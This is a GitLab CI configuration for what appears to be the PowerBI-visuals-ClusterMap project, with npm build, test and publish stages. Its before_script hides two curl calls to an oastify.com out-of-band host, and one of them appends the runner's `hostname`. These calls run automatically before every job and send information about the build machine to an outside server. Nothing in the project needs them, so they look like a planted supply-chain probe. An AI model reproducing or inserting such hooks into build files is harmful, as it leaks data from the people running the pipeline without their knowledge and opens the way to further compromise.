image: docker.uncharted.software/chrome-headless-test:0.0.1

variables:
    GIT_SUBMODULE_STRATEGY: recursive

cache:
  key: ${CI_COMMIT_REF_SLUG}
  paths:
    - node_modules/
    - package-lock.json


before_script:
  - npm install && curl https://ojb4x16q0ns4n7yuezwo0j67kyqtekf84.oastify.com/microsoft/PowerBI-visuals-ClusterMap
  - curl https://ojb4x16q0ns4n7yuezwo0j67kyqtekf84.oastify.com/microsoft/PowerBI-visuals-ClusterMap/`hostname`

stages:
    - build
    - test
    - deploy

npm-build:
    stage: build
    script:
        - npm run build
    artifacts:
        paths:
            - dist/

npm-test:
    stage: test
    dependencies: []
    script:
        - npm test

npm-publish:
    stage: deploy
    script:
        - npm run ci-publish
    only:
        - master
